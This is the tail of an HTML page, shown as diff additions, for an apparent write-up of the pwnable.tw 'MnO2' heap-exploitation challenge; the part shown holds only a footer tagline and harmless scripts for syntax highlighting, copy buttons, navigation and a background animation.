+  <div class="tagline">pwnable.tw &mdash; MnO2 &mdash; Heap Overflow + UAF + Tcache Poisoning</div>
+</div>
+</div></div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script>
+function copyCode(btn){const pre=btn.closest('.code-block').querySelector('pre');const code=pre.textContent;navigator.clipboard.writeText(code).then(()=>{btn.textContent='Copied!';btn.style.color='var(--green)';btn.style.borderColor='var(--green)';setTimeout(()=>{btn.textContent='Copy';btn.style.color='';btn.style.borderColor='';},1500);});}
+function toggleMobileNav(){document.getElementById('mobileOverlay').classList.toggle('show');document.getElementById('mobilePanel').classList.toggle('show');}
+(function(){const canvas=document.getElementById('bg-canvas');if(!canvas)return;const ctx=canvas.getContext('2d');let w,h,cols,drops;const chars='01'.split('');const fontSize=14;function resize(){w=canvas.width=window.innerWidth;h=canvas.height=window.innerHeight;cols=Math.floor(w/fontSize);drops=new Array(cols).fill(1);}resize();window.addEventListener('resize',resize);function draw(){ctx.fillStyle='rgba(10,14,23,0.06)';ctx.fillRect(0,0,w,h);ctx.fillStyle='#38bdf8';ctx.font=fontSize+'px monospace';for(let i=0;i<cols;i++){const char=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(char,i*fontSize,drops[i]*fontSize);if(drops[i]*fontSize>h&&Math.random()>0.975)drops[i]=0;drops[i]++;}}setInterval(draw,45);})();
+(function(){const tocLinks=document.querySelectorAll('.toc a');const sections=[];tocLinks.forEach(link=>{const id=link.getAttribute('href');if(id&&id.startsWith('#')){const el=document.querySelector(id);if(el)sections.push({el,link});}});function update(){let current=null;for(const s of sections){if(s.el.getBoundingClientRect().top<=120)current=s;}tocLinks.forEach(l=>l.classList.remove('active'));if(current)current.link.classList.add('active');}window.addEventListener('scroll',update);update();})();
+</script>
+</body></html>
